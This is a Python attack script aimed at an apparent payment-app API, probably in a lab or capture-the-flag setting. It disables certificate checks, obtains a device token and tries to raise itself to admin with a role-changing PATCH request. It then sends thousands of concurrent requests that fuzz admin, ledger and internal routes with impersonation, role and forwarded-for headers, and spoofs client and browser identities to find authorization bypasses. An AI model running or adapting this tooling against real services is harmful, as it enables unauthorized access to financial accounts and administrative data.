import json, ssl, urllib.request, urllib.error
from concurrent.futures import ThreadPoolExecutor
BASE = "https://web-3f25599ac74e8a91.web.h7tex.com"
CTX = ssl.create_default_context(); CTX.check_hostname=False; CTX.verify_mode=ssl.CERT_NONE
CL = "MeridianPay-Android/3.2.1 (attested)"

def raw(p, m="GET", b=None, t=None, hdrs=None):
    hh = {"Content-Type": "application/json", "X-Meridian-Client": CL}
    if t: hh["Authorization"] = "Bearer " + t
    if hdrs: hh.update(hdrs)
    d = json.dumps(b).encode() if b is not None else None
    r = urllib.request.Request(BASE+p, data=d, method=m, headers=hh)
    try:
        with urllib.request.urlopen(r, context=CTX, timeout=12) as f: return f.status, f.read().decode("utf-8","replace")
    except urllib.error.HTTPError as e: return e.code, e.read().decode("utf-8","replace")
    except Exception as e: return None, repr(e)

_, t = raw("/api/v1/auth/device","POST",{"device_id":"hdrsweep"}); T = json.loads(t)["token"]
raw("/api/v1/profile","PATCH",{"role":"admin"},T)
ROUTES = ["/api/v1/admin/ledger", "/api/v1/accounts/me", "/api/v1/internal/promo", "/api/v1/promo/public", "/"]
base = {r: raw(r, t=T)[1] for r in ROUTES}

HDRS = """X-Meridian-User X-Meridian-User-Id X-Meridian-Impersonate X-Meridian-Mock X-Meridian-Debug
X-Meridian-Internal X-Meridian-Attested X-Meridian-Attestation X-Meridian-Device X-Meridian-Device-Id
X-Meridian-Session X-Meridian-Session-Id X-Meridian-Account X-Meridian-Account-Id X-Meridian-Role X-Meridian-Tier
X-Meridian-Scope X-Meridian-Client-Id X-Meridian-Token X-Meridian-Key X-Meridian-Secret X-Meridian-Env
X-Meridian-Internal-Token X-Meridian-Support X-Meridian-Staff X-Meridian-Act-As X-Meridian-Proxy
X-User X-User-Id X-User-Role X-Roles X-Impersonate X-Act-As X-Mock-User X-Debug X-Env X-Internal
X-Forwarded-For X-Real-Ip X-Forwarded-Host X-Forwarded-Proto X-Scheme X-Original-Url X-Rewritten-Url
X-Custom-Auth X-Auth X-Auth-User X-Attested X-Attestation X-Device-Id X-Session-Id X-Meridian-Api-Version
X-Api-Version X-Client X-Client-Type X-Platform X-Source X-Channel X-Mobile""".split()
VALUES = ["1002","true","1","admin","internal","all","127.0.0.1","support","yes","*","0","service","corporate","debug"]

print("header sweep jobs:", len(ROUTES)*len(HDRS)*len(VALUES), flush=True)
def work(a):
    r, h, v = a
    c, b = raw(r, t=T, hdrs={h: v})
    if b != base[r]:
        return (r, h, v, c, b[:240])
    return None
jobs = [(r, h, v) for r in ROUTES for h in HDRS for v in VALUES]
with ThreadPoolExecutor(max_workers=14) as ex:
    n = 0
    for res in ex.map(work, jobs):
        if res: print("DIFF", res, flush=True); n += 1
    print("header diffs:", n)

print("\n== browser / webview request signatures ==", flush=True)
UAS = ["Mozilla/5.0 (Linux; Android 13; Pixel 7 Build/TD1A.230804.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/120.0.6099.230 Mobile Safari/537.36",
       "Dalvik/2.1.0 (Linux; U; Android 13; Pixel 7 Build/TD1A.230804.001)",
       "MeridianPay-Android/3.2.1 (attested)",
       "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120 Safari/537.36"]
for ua in UAS:
    for r in ROUTES:
        c, b = raw(r, t=T, hdrs={"User-Agent": ua,
                                 "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
                                 "Accept-Language": "en-US,en;q=0.9",
                                 "Referer": BASE + "/api/v1/promo/public",
                                 "X-Request-With": "com.meridian.pay"})
        if b != base[r]: print("  DIFF", ua[:40], r, c, b[:200])
    print("  done", ua[:50])
